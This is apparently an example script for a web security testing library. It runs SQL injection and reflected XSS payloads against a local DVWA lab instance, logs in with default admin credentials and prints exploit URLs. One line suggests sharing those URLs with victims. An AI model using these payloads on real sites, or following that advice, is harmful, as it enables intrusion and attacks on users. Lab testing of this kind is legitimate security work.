#!/usr/bin/env python3
"""
LogicPWN Simple Exploit Chain Example
This example demonstrates basic exploit chaining with LogicPWN.
Shows how to chain multiple requests for vulnerability testing.
"""

import asyncio
import re
from logicpwn.core.runner import AsyncRequestRunner

async def sql_injection_test():
    """Test SQL injection on DVWA"""
    print("üéØ SQL Injection Test Example")
    print("=" * 40)
    
    # First login to DVWA (simplified)
    session_cookie = await simple_dvwa_login()
    if not session_cookie:
        print("‚ùå Cannot login to DVWA - skipping SQL injection test")
        return
    
    async with AsyncRequestRunner() as runner:
        headers = {"Cookie": f"PHPSESSID={session_cookie}"}
        
        try:
            # Access SQL injection page
            sqli_url = "http://localhost:8080/vulnerabilities/sqli/"
            response = await runner.send_request(sqli_url, headers=headers)
            
            if response.status_code != 200:
                print("‚ùå Cannot access SQL injection page")
                return
            
            print("‚úÖ Accessed SQL injection page")
            
            # Test basic SQL injection payloads
            payloads = [
                "1",  # Normal request
                "1' OR '1'='1",  # Basic SQL injection
                "1' UNION SELECT user(), version()#",  # Union injection
                "1' AND (SELECT SUBSTRING(version(),1,1))='5'#"  # Boolean-based
            ]
            
            for i, payload in enumerate(payloads, 1):
                print(f"\n{i}. Testing payload: {payload}")
                
                # Send payload
                test_response = await runner.send_request(
                    sqli_url,
                    method="GET",
                    params={"id": payload, "Submit": "Submit"},
                    headers=headers
                )
                
                if test_response.status_code == 200:
                    # Analyze response
                    body_length = len(test_response.body)
                    print(f"   Response length: {body_length}")
                    
                    # Look for SQL error patterns
                    sql_errors = [
                        "mysql_fetch_array",
                        "Warning: mysql",
                        "MySQL Error",
                        "sql syntax",
                        "ORA-"
                    ]
                    
                    errors_found = []
                    for error in sql_errors:
                        if error.lower() in test_response.body.lower():
                            errors_found.append(error)
                    
                    if errors_found:
                        print(f"   üö® SQL errors detected: {errors_found}")
                    
                    # Look for successful injection indicators
                    if "admin" in test_response.body and len(test_response.body) > 1000:
                        print(f"   ‚úÖ Potential successful injection!")
                    
                    # Security analysis
                    if test_response.security_analysis:
                        if test_response.security_analysis.has_sql_errors:
                            print(f"   üîç Security analysis detected SQL errors")
                else:
                    print(f"   ‚ùå Request failed: {test_response.status_code}")
            
        except Exception as e:
            print(f"‚ùå SQL injection test error: {e}")

async def xss_test_chain():
    """Test XSS vulnerability chain"""
    print("\nüéØ XSS Test Chain Example")
    print("=" * 40)
    
    session_cookie = await simple_dvwa_login()
    if not session_cookie:
        print("‚ùå Cannot login to DVWA - skipping XSS test")
        return
    
    async with AsyncRequestRunner() as runner:
        headers = {"Cookie": f"PHPSESSID={session_cookie}"}
        
        try:
            # Test reflected XSS
            xss_url = "http://localhost:8080/vulnerabilities/xss_r/"
            
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>", 
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<script>prompt('Reflected XSS')</script>"
            ]
            
            vulnerable_count = 0
            
            for i, payload in enumerate(xss_payloads, 1):
                print(f"\n{i}. Testing XSS payload: {payload[:30]}...")
                
                # Send XSS payload
                response = await runner.send_request(
                    xss_url,
                    method="GET",
                    params={"name": payload},
                    headers=headers
                )
                
                if response.status_code == 200:
                    # Check if payload is reflected
                    if payload in response.body:
                        print(f"   ‚úÖ Payload reflected in response!")
                        
                        # Check if it's properly encoded
                        if "&lt;" in response.body or "&gt;" in response.body:
                            print(f"   üõ°Ô∏è  Payload appears to be encoded")
                        else:
                            print(f"   üö® Payload NOT encoded - potential XSS!")
                            vulnerable_count += 1
                            
                            # Generate exploit URL
                            import urllib.parse
                            encoded_payload = urllib.parse.quote(payload)
                            exploit_url = f"{xss_url}?name={encoded_payload}"
                            print(f"   üîó Exploit URL: {exploit_url}")
                    else:
                        print(f"   ‚ùå Payload not found in response")
                        
                    # Security analysis
                    if response.security_analysis:
                        if response.security_analysis.has_xss_vectors:
                            print(f"   üîç Security analysis detected XSS vectors")
                else:
                    print(f"   ‚ùå Request failed: {response.status_code}")
            
            # Summary
            print(f"\nüìä XSS Test Results:")
            print(f"   ‚Ä¢ Total payloads tested: {len(xss_payloads)}")
            print(f"   ‚Ä¢ Vulnerable payloads: {vulnerable_count}")
            if vulnerable_count > 0:
                print(f"   üö® REFLECTED XSS VULNERABILITY CONFIRMED!")
                print(f"   üí° Share exploit URLs with victims to execute XSS")
                    
        except Exception as e:
            print(f"‚ùå XSS test error: {e}")

async def simple_dvwa_login():
    """Simple DVWA login function"""
    async with AsyncRequestRunner() as runner:
        try:
            # Get login page
            response = await runner.send_request("http://localhost:8080/login.php")
            
            # Extract CSRF token
            csrf_token = None
            token_match = re.search(r'user_token["\']?\s*value=["\']([^"\']+)', response.body)
            if token_match:
                csrf_token = token_match.group(1)
            
            # Login data
            login_data = {
                "username": "admin",
                "password": "admin",
                "Login": "Login"
            }
            
            if csrf_token:
                login_data["user_token"] = csrf_token
            
            # Perform login
            login_response = await runner.send_request(
                "http://localhost:8080/login.php",
                method="POST",
                data=login_data
            )
            
            # Extract session cookie
            set_cookie = login_response.headers.get("Set-Cookie", "")
            cookie_match = re.search(r'PHPSESSID=([^;]+)', set_cookie)
            if cookie_match:
                return cookie_match.group(1)
                
        except Exception as e:
            print(f"Login error: {e}")
        
        return None

async def main():
    """Run exploit chain examples"""
    print("üöÄ LogicPWN Simple Exploit Chain Examples")
    print("=" * 60)
    print("Demonstrates basic vulnerability testing chains")
    print()
    
    # Check DVWA availability
    async with AsyncRequestRunner() as runner:
        try:
            response = await runner.send_request("http://localhost:8080")
            if response.status_code != 200:
                print("‚ùå DVWA not accessible on localhost:8080")
                print("üí° Run: docker run -d -p 8080:80 vulnerables/web-dvwa:latest")
                return
        except Exception as e:
            print(f"‚ùå Cannot connect to DVWA: {e}")
            return
    
    print("‚úÖ DVWA accessible - starting exploit chain tests")
    
    # Run exploit tests
    await sql_injection_test()
    await xss_test_chain()
    
    print("\nüéâ Exploit chain examples completed!")
    print("\nNext steps:")
    print("- Analyze results and tune payloads")
    print("- Try other DVWA vulnerabilities")
    print("- Build more complex exploit chains")

if __name__ == "__main__":
    asyncio.run(main())
